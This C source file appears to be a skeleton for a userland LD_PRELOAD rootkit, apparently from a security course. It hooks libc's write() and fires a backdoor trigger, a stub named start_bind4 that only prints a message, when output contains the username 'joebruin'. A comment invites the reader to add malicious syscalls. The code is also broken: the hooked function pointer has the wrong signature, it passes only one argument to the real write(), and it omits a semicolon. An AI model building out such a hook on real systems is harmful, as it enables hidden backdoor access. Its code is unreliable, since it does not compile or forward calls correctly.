#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define TRIGGER_USERNAME "joebruin"

/* Call this function when a user logs in via ssh with the trigger username */
void start_bind4() {
  printf("The Hacking Has Begun\n");
}

/* Write your malicious syscall(s) here */

ssize_t write(int fd, const void *buff, size_t count) {
	ssize_t (*new_write)(ssize_t count);
	ssize_t result;

	new_write = dlsym(RTLD_NEXT, "write");

	if (strstr(buff, TRIGGER_USERNAME) != NULL) {
		start_bind4();
	}

	result = new_write(count);

	return result
}
